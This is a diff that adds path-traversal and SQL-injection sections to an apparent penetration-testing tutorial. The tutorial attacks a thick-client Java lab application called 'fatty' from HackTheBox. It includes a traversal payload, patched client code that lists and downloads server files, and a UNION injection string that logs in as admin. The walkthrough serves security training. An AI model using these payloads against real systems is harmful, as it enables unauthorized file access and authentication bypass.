@@ -9,6 +9,8 @@
     - [Retrieving Hardcoded Creds from Thick Client Applications](#retrieving-hardcoded-creds-from-thick-client-applications)
   - [Exploiting Web Vulnerabilities in Thick-Client Applications](#exploiting-web-vulnerabilities-in-thick-client-applications)
     - [Foothold](#foothold)
+    - [Path Traversal](#path-traversal)
+    - [SQLi](#sqli)
 
 ---
 
@@ -376,3 +378,312 @@ This note informs you that a few critical issues in the application still need t
 
 The message from dave says that all admin users are removed from the database. It also refers to a timeout implemented in the login procedure to mitigate time-based SQLi attacks.
 
+### Path Traversal
+
+Since you can read files, attempt a path traversal attack by giving the following payload in the field and clicking the "Open" button.
+
+```
+../../../../../../etc/passwd
+```
+
+![attacking thick client 15](../../../images/attacking_thick_client15.png)
+
+The server filters out the ```/``` character from the input. Decompile the application using [JD-GUI](http://java-decompiler.github.io/), by dragging and dropping the fatty-client-new.jar onto the jd-gui.
+
+![attacking thick client 16](../../../images/attacking_thick_client16.png)
+
+Save the source code by pressing the "Save All Sources" option in jdgui. Decompress the fatty-client-new.jar.src.zip by right-clicking and selecting "Extract files". The file fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java handles the application features. Reading its contents reveals the following code.
+
+```java
+public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
+    String methodName = (new Object() {
+      
+      }).getClass().getEnclosingMethod().getName();
+    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
+    if (AccessCheck.checkAccess(methodName, this.user))
+      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
+    this.action = new ActionMessage(this.sessionID, "files");
+    this.action.addArgument(folder);
+    sendAndRecv();
+    if (this.response.hasError())
+      return "Error: Your action caused an error on the application server!"; 
+    return this.response.getContentAsString();
+  }
+```
+
+The showfiles function takes in one argument for the folder name and then sends the data to the server using the sendAndRecv() call. The file fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java sets the folder option. Read its contents.
+
+```java
+configs.addActionListener(new ActionListener() {
+          public void actionPerformed(ActionEvent e) {
+            String response = "";
+            ClientGuiTest.this.currentFolder = "configs";
+            try {
+              response = ClientGuiTest.this.invoker.showFiles("configs");
+            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
+              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
+            } catch (IOException e2) {
+              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
+            } 
+            textPane.setText(response);
+          }
+        });
+```
+
+You can replace the configs folder name with ".." as follows.
+
+```java
+ClientGuiTest.this.currentFolder = "..";
+  try {
+    response = ClientGuiTest.this.invoker.showFiles("..");
+```
+
+Next, compile the ClientGuiTest.Java file.
+
+```powershell
+C:\> javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
+```
+
+This generates several class files. Create a new folder and extract the contents of fatty-client-new.jar into it.
+
+```powershell
+C:\> mkdir raw
+C:\> cp fatty-client-new.jar raw\fatty-client-new-2.jar
+```
+
+Navigate to the raw directory and decompress fatty-client-new-2.jar by right-clicking and selecting "Extract Here". Overwrite any existing htb/fatty/client/gui/*.class files with updated class files.
+
+```powershell
+C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
+```
+
+Finally, build the new JAR file.
+
+```powershell
+C:\> cd raw
+C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .
+```
+
+Log in to the application and navigate to "FileBrowser" -> "Config" option.
+
+![attacking thick client 17](../../../images/attacking_thick_client17.png)
+
+This is successful. You can now see the content of the directory ```configs/../.```. The files fatty-server.jar and start.sh look interesting. Listing the content of the start.sh file reveals that fatty-server.jar is running inside an Alpine Docker container.
+
+![attacking thick client 18](../../../images/attacking_thick_client18.png)
+
+You can modify the open function in fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java to download the file fatty-server.jar as follows:
+
+```java
+import java.io.FileOutputStream;
+<SNIP>
+public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
+    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
+    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
+    if (AccessCheck.checkAccess(methodName, this.user)) {
+        return "Error: Method '" + methodName + "' is not allowed for this user account";
+    }
+    this.action = new ActionMessage(this.sessionID, "open");
+    this.action.addArgument(foldername);
+    this.action.addArgument(filename);
+    sendAndRecv();
+    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
+    FileOutputStream fos = new FileOutputStream(desktopPath);
+    
+    if (this.response.hasError()) {
+        return "Error: Your action caused an error on the application server!";
+    }
+    
+    byte[] content = this.response.getContent();
+    fos.write(content);
+    fos.close();
+    
+    return "Successfully saved the file to " + desktopPath;
+}
+<SNIP>
+```
+
+Rebuild the JAR file following the same steps and log in again to the application. Then, navigate to "FileBrowser" -> "Config", add the fatty-server.jar name in the input field, and click the "Open" button.
+
+![attacking thick client 19](../../../images/attacking_thick_client19.png)
+
+The fatty-server.jar file is successfully downloaded onto your desktop, and you can start the examination.
+
+```powershell
+C:\> ls C:\Users\cybervaca\Desktop\
+
+...SNIP...
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/25/2023  11:38 AM       10827452 fatty-server.jar
+```
+
+### SQLi
+
+Decompiling the fatty-server.jar using JD-GUI reveals the file htb/fatty/server/database/FattyDbSession.class that contains a checkLogin() function that handles the login functionality. This function retrieves user details based on the provided username. It then compares the retrieved password with the provided password.
+
+```java
+public User checkLogin(User user) throws LoginException {
+    <SNIP>
+      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
+      <SNIP>
+        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
+          return newUser; 
+        throw new LoginException("Wrong Password!");
+      <SNIP>
+           this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
+      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
+      return null;
+```
+
+Check how the client application sends credentials to the server. The login button creates the new object ClientGuiTest.this.user for the User class. It then calls the setUsername() and setPassword() functions with the respective username and password values. The values that are returned from these functions are then sent to the server.
+
+![attacking thick client 20](../../../images/attacking_thick_client20.png)
+
+Check the setUsername() and setPassword() functions from htb/fatty/shared/resources/user.java.
+
+```java
+public void setUsername(String username) {
+    this.username = username;
+  }
+  
+  public void setPassword(String password) {
+    String hashString = this.username + password + "clarabibimakeseverythingsecure";
+    MessageDigest digest = null;
+    try {
+      digest = MessageDigest.getInstance("SHA-256");
+    } catch (NoSuchAlgorithmException e) {
+      e.printStackTrace();
+    } 
+    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
+    this.password = DatatypeConverter.printHexBinary(hash);
+  }
+```
+
+The username is accepted without modification, but the password is changed to the format below.
+
+```java
+sha256(username+password+"clarabibimakeseverythingsecure")
+```
+
+You also notice that the username isn't sanitized and is directly used in the SQL query, making it vulnerable to SQLi.
+
+```java
+rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
+```
+
+The checkLogin function in htb/fatty/server/database/FattyDbSession.class writes the SQL exception to a log file.
+
+```java
+<SNIP>
+    this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
+      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
+<SNIP>
+```
+
+Login into the application using the username ```qtc'``` to validate the SQLi vulnerability reveals a syntax error. To see the error, you need to edit the code in the fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java file as follows:
+
+```java
+ClientGuiTest.this.currentFolder = "../logs";
+  try {
+    response = ClientGuiTest.this.invoker.showFiles("../logs");
+```
+
+Listing the content of the error-log.txt file reveals the following message.
+
+![attacking thick client 21](../../../images/attacking_thick_client21.png)
+
+This confirms that the username field is vulnerable to SQLi. However, login attempts using payloads such as ```' or '1'='1``` in both fields fail. Assuming that the username in the login form is ```' or '1'='1```, the server will process the username as below.
+
+```sql
+SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'
+```
+
+The above query succeeds and returns the first record in the database. The server then creates a new user object with the obtained results.
+
+```java
+<SNIP>
+if (rs.next()) {
+        int id = rs.getInt("id");
+        String username = rs.getString("username");
+        String email = rs.getString("email");
+        String password = rs.getString("password");
+        String role = rs.getString("role");
+        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
+<SNIP>
+```
+
+It then compates the newly created user password with the user-supplied password.
+
+```java
+<SNIP>
+if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
+    return newUser;
+throw new LoginException("Wrong Password!");
+<SNIP>
+```
+
+Then, the following value is produced by newUser.getPassword() function.
+
+```java
+sha256("qtc"+"clarabibi"+"clarabibimakeseverythingsecure") = 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046
+```
+
+The user-supplied password hash user.getPassword() is calculated as follows.
+
+```java
+sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8
+```
+
+Although the hash sent to the server by the client doesn't match the one in the database, and the password comparison fails, the SQLi is still possible using UNION queries. Consider the following example.
+
+```sql
+MariaDB [userdb]> select * from users where username='john';
++----------+-------------+
+| username | password    |
++----------+-------------+
+| john     | password123 |
++----------+-------------+
+```
+
+It is possible to create fake entries using the SELECT operator. Input an invalid username to create a new user entry.
+
+```sql
+MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
++----------+-------------+
+| username | password    |
++----------+-------------+
+| admin    | welcome123  |
++----------+-------------+
+```
+
+Similarily, the injection in the username filed can be leveraged to create a fake user entry.
+
+```sql
+test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin
+```
+
+This way, the password, and the assigned role can be controlled. The following snippet of code sends the plaintext password entered in the form. Modify the code in htb/fatty/shared/resources/User.java to submit the password as it is from the client application.
+
+```java
+public User(int uid, String username, String password, String email, Role role) {
+    this.uid = uid;
+    this.username = username;
+    this.password = password;
+    this.email = email;
+    this.role = role;
+}
+public void setPassword(String password) {
+    this.password = password;
+  }
+```
+
+You can now rebuild the JAR file and attempt to log in using the payload ```abc' UNION SELECT 1,'abc','a@b.com','abc','admin``` in the username field and the random text ```abc``` in the password field.
+
+The server will eventually process the following query.
+
+```sql
+select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
+```
+
+The first select query fails, while the second returns valid user results with the role "admin" and the password "abc". The password sent to the server is also "abc", which results in a successful password comparison, and the application allows you to log in as the user "admin".
